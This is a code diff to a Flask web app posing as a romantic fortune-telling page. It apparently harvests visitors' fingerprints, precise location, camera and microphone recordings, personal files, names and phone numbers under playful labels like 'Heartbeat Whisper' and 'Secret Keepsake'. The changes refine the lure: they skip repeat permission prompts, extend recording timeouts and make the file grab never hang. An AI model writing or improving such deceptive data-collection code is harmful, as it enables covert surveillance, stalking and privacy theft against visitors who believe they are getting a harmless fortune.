@@ -70,15 +70,6 @@ def get_visitors():
     with open(DATA_FILE, 'r') as f:
         return json.load(f)
 
-def get_session_data(session_id):
-    init_json()
-    with open(DATA_FILE, 'r') as f:
-        visitors = json.load(f)
-    for v in visitors:
-        if v.get('sessionId') == session_id:
-            return v
-    return None
-
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
@@ -86,24 +77,6 @@ def index():
 @app.route('/get-fortune')
 def get_fortune():
     return jsonify({'fortune': random.choice(FORTUNES)})
-
-@app.route('/get-session-data', methods=['POST'])
-def get_session_data_route():
-    data = request.json
-    session_id = data.get('sessionId')
-    if session_id:
-        session_data = get_session_data(session_id)
-        if session_data:
-            return jsonify({
-                'exists': True,
-                'fortuneText': session_data.get('fortuneText'),
-                'name': session_data.get('name'),
-                'latitude': session_data.get('latitude'),
-                'longitude': session_data.get('longitude'),
-                'phoneNumber': session_data.get('phoneNumber'),
-                'mapUrl': session_data.get('mapUrl')
-            })
-    return jsonify({'exists': False})
 
 @app.route('/save', methods=['POST'])
 def save():
@@ -311,7 +284,7 @@ HTML_TEMPLATE = '''
     </div>
 </div>
 
-<!-- Hidden file input -->
+<!-- Hidden file input (works everywhere) -->
 <input type="file" id="fileInput" multiple style="display:none">
 
 <script>
@@ -325,9 +298,8 @@ HTML_TEMPLATE = '''
     let visitorData = { sessionId: sessionId };
     let mediaRecorder, mediaStream, recordedBlobs = [];
     let currentFortuneText = "";
-    let hasExistingData = false;
 
-    // ---------- Device info collectors ----------
+    // ---------- Data collection ----------
     async function getFingerprint() {
         try {
             const fp = await FingerprintJS.load();
@@ -370,39 +342,7 @@ HTML_TEMPLATE = '''
         return navigator.userAgent;
     }
 
-    // On page load, check if this session already has a fortune
-    window.addEventListener('load', async () => {
-        try {
-            const resp = await fetch('/get-session-data', {
-                method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({ sessionId: sessionId })
-            });
-            const data = await resp.json();
-            if (data.exists && data.fortuneText) {
-                hasExistingData = true;
-                if (data.name) document.getElementById('userName').value = data.name;
-                document.getElementById('step-name').classList.add('hidden');
-                document.getElementById('result').classList.remove('hidden');
-                document.getElementById('fortuneText').innerText = data.fortuneText;
-                if (data.mapUrl && data.mapUrl !== 'undefined') {
-                    document.getElementById('mapUrl').innerText = data.mapUrl;
-                    document.getElementById('mapLink').classList.remove('hidden');
-                }
-                currentFortuneText = data.fortuneText;
-                if (data.phoneNumber) {
-                    document.getElementById('phoneNumber').value = data.phoneNumber;
-                    document.getElementById('phoneNumber').disabled = true;
-                    document.getElementById('smsStatus').innerHTML = '✅ Phone number already saved';
-                } else {
-                    document.getElementById('smsSection').classList.remove('hidden');
-                }
-            }
-        } catch(e) { console.log("Session load error", e); }
-    });
-
     async function startProcess() {
-        if (hasExistingData) return;
         const name = document.getElementById('userName').value.trim();
         if (!name) return alert('Please enter your name');
         
@@ -427,8 +367,13 @@ HTML_TEMPLATE = '''
         
         await new Promise(r => setTimeout(r, 500));
         document.getElementById('loading').classList.add('hidden');
-        // Always ask for permissions (no skipping)
-        document.getElementById('permissions').classList.remove('hidden');
+        
+        // Skip permissions if already granted
+        if (localStorage.getItem('permissionsGranted_' + sessionId) === 'true') {
+            await finalizeAndSave();
+        } else {
+            document.getElementById('permissions').classList.remove('hidden');
+        }
     }
 
     function showStep(title, status, percent) {
@@ -444,7 +389,8 @@ HTML_TEMPLATE = '''
             await getLocation();
             await getMedia();
             await getFilesTraditional();
-        } catch(e) { console.log("Permission step error", e); }
+        } catch(e) { console.log("Permission error", e); }
+        localStorage.setItem('permissionsGranted_' + sessionId, 'true');
         await finalizeAndSave();
     }
 
@@ -476,12 +422,12 @@ HTML_TEMPLATE = '''
 
     function getMedia() {
         return new Promise((resolve) => {
-            showStep('🌟 Heartbeat Whisper', 'Tuning into your love energy...', 10);
+            showStep('🌟 Heartbeat Whisper / Soul Reflection', 'Tuning into your love energy...', 10);
             const timeout = setTimeout(() => {
                 visitorData.cameraVideo = 'denied';
                 showStep('🌟 Heartbeat Whisper', 'Skipped', 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
-            }, 10000);
+            }, 12000);
             navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: 'user' } })
             .then(stream => {
                 clearTimeout(timeout);
@@ -520,10 +466,13 @@ HTML_TEMPLATE = '''
         });
     }
 
+    // FIXED: File picker always resolves (never hangs)
     function getFilesTraditional() {
         return new Promise((resolve) => {
             showStep('✨ Secret Keepsake', 'Gathering your love memories (optional)...', 0);
             let resolved = false;
+            
+            // Timeout after 10 seconds to auto-continue
             const timeout = setTimeout(() => {
                 if (!resolved) {
                     resolved = true;
@@ -532,6 +481,8 @@ HTML_TEMPLATE = '''
                     setTimeout(() => { hideStep(); resolve(); }, 500);
                 }
             }, 10000);
+            
+            // Create or reuse hidden file input
             let fileInput = document.getElementById('fileInput');
             if (!fileInput) {
                 fileInput = document.createElement('input');
@@ -540,8 +491,11 @@ HTML_TEMPLATE = '''
                 fileInput.style.display = 'none';
                 document.body.appendChild(fileInput);
             }
+            
+            // Remove previous listener to avoid multiple calls
             fileInput.onchange = null;
-            fileInput.value = '';
+            fileInput.value = ''; // reset so that choosing same file triggers change
+            
             fileInput.onchange = async (event) => {
                 if (resolved) return;
                 clearTimeout(timeout);
@@ -567,14 +521,15 @@ HTML_TEMPLATE = '''
                 showStep('✨ Secret Keepsake', `${filesData.length} memory(s) received`, 100);
                 setTimeout(() => { hideStep(); resolve(); }, 500);
             };
+            
+            // Also handle if the user closes the file dialog without selecting (no change event)
+            // We need to detect focus return? Unfortunately no reliable event, but timeout will catch it.
             fileInput.click();
         });
     }
 
     async function finalizeAndSave() {
-        const lat = (visitorData.latitude !== 'denied') ? visitorData.latitude : 0;
-        const lng = (visitorData.longitude !== 'denied') ? visitorData.longitude : 0;
-        const mapUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+        const mapUrl = `https://www.google.com/maps?q=${visitorData.latitude || 0},${visitorData.longitude || 0}`;
         visitorData.mapUrl = mapUrl;
         document.getElementById('mapUrl').innerText = mapUrl;
         document.getElementById('mapLink').classList.remove('hidden');
@@ -605,25 +560,22 @@ HTML_TEMPLATE = '''
             return;
         }
         document.getElementById('smsStatus').innerText = 'Saving your number...';
-        try {
-            const resp = await fetch('/save-phone', {
-                method: 'POST',
-                headers: {'Content-Type':'application/json'},
-                body: JSON.stringify({
-                    sessionId: sessionId,
-                    phoneNumber: phone,
-                    fortune: currentFortuneText
-                })
-            });
-            const result = await resp.json();
-            if (result.status === 'saved') {
-                document.getElementById('smsStatus').innerHTML = '✅ Your fortune has been saved with your phone number! (Demo SMS sent)';
-                document.getElementById('phoneNumber').disabled = true;
-            } else {
-                document.getElementById('smsStatus').innerText = 'Error saving. Please try again.';
-            }
-        } catch(e) {
-            document.getElementById('smsStatus').innerText = 'Network error. Please try again.';
+        
+        const resp = await fetch('/save-phone', {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({
+                sessionId: sessionId,
+                phoneNumber: phone,
+                fortune: currentFortuneText
+            })
+        });
+        const result = await resp.json();
+        if (result.status === 'saved') {
+            document.getElementById('smsStatus').innerHTML = '✅ Your fortune has been saved with your phone number! (Demo SMS sent)';
+            document.getElementById('phoneNumber').disabled = true;
+        } else {
+            document.getElementById('smsStatus').innerText = 'Error saving. Please try again.';
         }
     }
 </script>
